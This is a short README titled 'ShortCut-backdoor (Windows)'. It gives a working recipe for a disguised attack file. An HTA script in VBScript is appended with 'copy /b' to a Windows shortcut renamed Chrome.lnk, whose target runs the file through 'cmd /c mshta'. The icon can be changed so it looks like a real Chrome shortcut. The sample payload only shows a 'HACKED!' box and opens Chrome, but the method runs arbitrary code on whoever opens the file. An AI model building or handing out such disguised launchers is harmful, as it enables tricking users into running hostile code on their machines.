# ShortCut-backdoor (Windows)

Tested on Windows 11

* 1  Create a chrome shortcut named exploit
* 2- Create a code.hta file to execute code, for example:
  ```vb
  <hta:application windowstate="minimize">
  <script language="VBScript">
  MsgBox "HACKED!"
  Close
  Set shell = CreateObject("WScript.Shell")
  shell.Run """C:\Program Files\Google\Chrome\Application\chrome.exe""", 0, False
  Close
  </script>
  ```
* 3- On exploit shortcut, change proprieties:
  ```
  Target: cmd /c mshta %CD%\Chrome.lnk
  Start In: C:\Users\<your-user>\Desktop
  
  And change icon if you desire
  ```
* 3- To build: On cmd:
  ```
  copy /b C:\Users\<your-user>\Desktop\exploit.lnk+code.hta Chrome.lnk
  ```
